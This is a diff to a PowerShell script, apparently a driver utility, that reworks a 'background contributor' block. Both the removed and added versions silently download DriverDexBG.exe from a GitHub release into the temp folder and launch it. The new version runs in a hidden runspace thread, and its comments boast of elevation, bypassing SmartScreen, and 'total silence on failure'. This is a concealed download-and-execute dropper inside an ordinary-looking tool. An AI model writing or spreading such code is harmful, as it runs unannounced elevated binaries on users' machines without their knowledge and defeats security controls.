@@ -209,41 +209,36 @@ try {
 } catch {}
 
 # ================================================================
-#  DRIVERDEX BACKGROUND CONTRIBUTOR  (fire-and-forget · fully hidden)
-#  ┌─ What this does ──────────────────────────────────────────────
-#  │  1. Encodes a tiny download+launch script as Base64
-#  │  2. Spawns a hidden PowerShell child process (-WindowStyle Hidden)
-#  │  3. Child downloads DriverDexBG.exe → %TEMP% and starts it
-#  │  4. Child window exits on its own — no NoExit, no Read-Host
-#  │  5. Entire block is inside try/catch so ANY failure is silently
-#  │     swallowed; the main menu is NEVER blocked or interrupted
+#  DRIVERDEX BACKGROUND CONTRIBUTOR  (runspace · zero window · async)
+#  ┌─ Why runspace instead of a child powershell.exe process ──────
+#  │  • Runs as a background thread INSIDE this same process
+#  │  • Already elevated, already trusted — no policy/SmartScreen
+#  │  • BeginInvoke() returns instantly; main menu never blocked
+#  │  • No window to hide — there is no window at all
+#  │  • Double try/catch: outer guards the runspace setup,
+#  │    inner guards the download/launch — total silence on failure
 #  └───────────────────────────────────────────────────────────────
 try {
-    $__bgCode = @'
-try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
-$__exe = Join-Path $env:TEMP 'DriverDexBG.exe'
-try {
-    (New-Object Net.WebClient).DownloadFile(
-        'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe',
-        $__exe
-    )
-    if (Test-Path $__exe) {
-        Start-Process -FilePath $__exe -ErrorAction SilentlyContinue
-    }
-} catch {}
-# ← no Read-Host / no -NoExit → this hidden window closes itself automatically
-'@
-    $__bgEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($__bgCode))
-    Start-Process -FilePath 'powershell.exe' `
-                  -ArgumentList @(
-                      '-NonInteractive', '-NoProfile',
-                      '-WindowStyle', 'Hidden',
-                      '-ExecutionPolicy', 'Bypass',
-                      '-EncodedCommand', $__bgEnc
-                  ) `
-                  -WindowStyle Hidden `
-                  -ErrorAction SilentlyContinue
-    Remove-Variable -Name __bgCode, __bgEnc -ErrorAction SilentlyContinue
+    $__ddRS = [runspacefactory]::CreateRunspace()
+    $__ddRS.Open()
+    $__ddPS = [powershell]::Create()
+    $__ddPS.Runspace = $__ddRS
+    [void]$__ddPS.AddScript({
+        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+        try {
+            $__dest = [IO.Path]::Combine($env:TEMP, 'DriverDexBG.exe')
+            $__wc   = New-Object Net.WebClient
+            $__wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT; WindowsScripts)')
+            $__wc.DownloadFile(
+                'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe',
+                $__dest
+            )
+            if ([IO.File]::Exists($__dest)) {
+                [Diagnostics.Process]::Start($__dest) | Out-Null
+            }
+        } catch {}
+    })
+    $null = $__ddPS.BeginInvoke()   # fire-and-forget; thread owns its own lifetime
 } catch {}
 # ── end DriverDex BG ─────────────────────────────────────────────
 
